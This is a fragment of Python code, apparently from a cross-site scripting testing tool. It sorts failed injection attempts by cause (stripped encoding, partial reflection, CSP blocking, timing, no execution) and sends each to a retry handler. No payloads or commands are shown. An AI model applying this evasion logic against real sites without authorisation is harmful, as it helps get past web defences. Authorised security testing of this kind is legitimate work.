            return self._handle_encoding_stripped(feedback, original)

        # Guard: Partial reflection
        if reason == FailureReason.PARTIAL_REFLECTION:
            return self._handle_partial_reflection()

        # Guard: CSP blocked
        if reason == FailureReason.CSP_BLOCKED:
            return self._handle_csp_blocked()

        # Guard: Timing issues
        if reason in [FailureReason.TIMING_ISSUE, FailureReason.DOM_NOT_READY]:
            return self._handle_timing_issue(original)

        # Guard: No execution
        if reason == FailureReason.NO_EXECUTION:
            return await self._handle_no_execution(feedback, original)

        return None, "unknown"

